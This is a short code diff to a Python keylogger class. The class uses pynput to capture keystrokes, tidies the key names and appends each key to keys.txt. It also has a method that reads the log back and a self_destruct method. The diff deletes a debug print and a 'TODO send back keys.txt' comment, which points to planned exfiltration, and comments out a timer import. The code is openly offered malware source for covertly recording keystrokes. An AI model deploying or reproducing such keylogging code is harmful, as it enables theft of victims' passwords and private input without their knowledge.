@@ -1,6 +1,5 @@
-import os
 from pynput.keyboard import Listener
-from threading import Timer
+#from threading import Timer
 
 class KeyLogger:
     def __init__(self):
@@ -14,7 +13,6 @@ class KeyLogger:
         k = k.replace("Key.space", " ")
         k = k.replace("Key.caps_lock", "Caps Lock")
         
-        print(k)
         file = open("keys.txt", "a")
         file.write(k)
         file.write('\n')
@@ -28,7 +26,6 @@ class KeyLogger:
     def readkeys(self):
         with open('keys.txt', 'r') as file:
             return file.read().rstrip()
-        #TODO send back keys.txt 
 
     def self_destruct(self):
         self.listener.stop()
